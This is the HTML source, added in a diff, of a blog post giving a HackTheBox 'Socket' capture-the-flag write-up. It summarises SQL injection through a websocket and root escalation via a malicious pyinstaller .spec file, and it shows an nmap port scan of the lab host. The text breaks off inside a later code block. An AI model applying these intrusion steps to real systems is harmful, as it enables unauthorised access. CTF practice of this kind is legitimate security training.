@@ -1,0 +1,1501 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Socket is a medium difficulty box where we must interact with an open websocket to uncover sensitive information through SQLi exploitation. After gaining credentials and ssh access, we learn that we can run pyinstaller as root. By creating and supplying a malicious .spec file, we are able to escalate our privileges to full root authority.'><title>HackTheBox - Socket</title>
+
+<link rel='canonical' href='https://yuwenmichael.netlify.app/post/hackthebox-socket/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - Socket'>
+<meta property='og:description' content='Socket is a medium difficulty box where we must interact with an open websocket to uncover sensitive information through SQLi exploitation. After gaining credentials and ssh access, we learn that we can run pyinstaller as root. By creating and supplying a malicious .spec file, we are able to escalate our privileges to full root authority.'>
+<meta property='og:url' content='https://yuwenmichael.netlify.app/post/hackthebox-socket/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQLi' /><meta property='article:tag' content='Python' /><meta property='article:tag' content='WebSocket' /><meta property='article:published_time' content='2023-07-15T15:06:40-05:00'/><meta property='article:modified_time' content='2023-07-15T15:06:40-05:00'/><meta property='og:image' content='https://yuwenmichael.netlify.app/post/hackthebox-socket/Socket.png' />
+<meta name="twitter:title" content="HackTheBox - Socket">
+<meta name="twitter:description" content="Socket is a medium difficulty box where we must interact with an open websocket to uncover sensitive information through SQLi exploitation. After gaining credentials and ssh access, we learn that we can run pyinstaller as root. By creating and supplying a malicious .spec file, we are able to escalate our privileges to full root authority."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yuwenmichael.netlify.app/post/hackthebox-socket/Socket.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">CTF Adventures</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-socket/">
+                <img src="/post/hackthebox-socket/Socket_hu849eb59558b706146747b24028bb82f3_354031_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-socket/Socket_hu849eb59558b706146747b24028bb82f3_354031_800x0_resize_box_3.png 800w, /post/hackthebox-socket/Socket_hu849eb59558b706146747b24028bb82f3_354031_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Socket" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack The Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-socket/">HackTheBox - Socket</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Socket is a medium difficulty box where we must interact with an open websocket to uncover sensitive information through SQLi exploitation. After gaining credentials and ssh access, we learn that we can run pyinstaller as root. By creating and supplying a malicious .spec file, we are able to escalate our privileges to full root authority.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 15, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="initial-enumeration">Initial Enumeration</h2>
+<p>Initial nmap scanning reveals a web page, and an unusual open port only visible through full port scan:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.93 scan initiated Sat Mar 25 21:05:47 2023 as: nmap -p- -oN portsweep 10.10.11.206</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.206
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.058s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65532</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh
+</span></span><span class="line"><span class="cl">80/tcp   open  http
+</span></span><span class="line"><span class="cl">5789/tcp open  unknown
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Mar 25 21:05:47 2023 -- 1 IP address (1 host up) scanned in 35.78 seconds</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The port is uncommon, so I decided to see what nmap script and version enumeration can tell me:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span></code></pre></td>
+<td class="lntd">
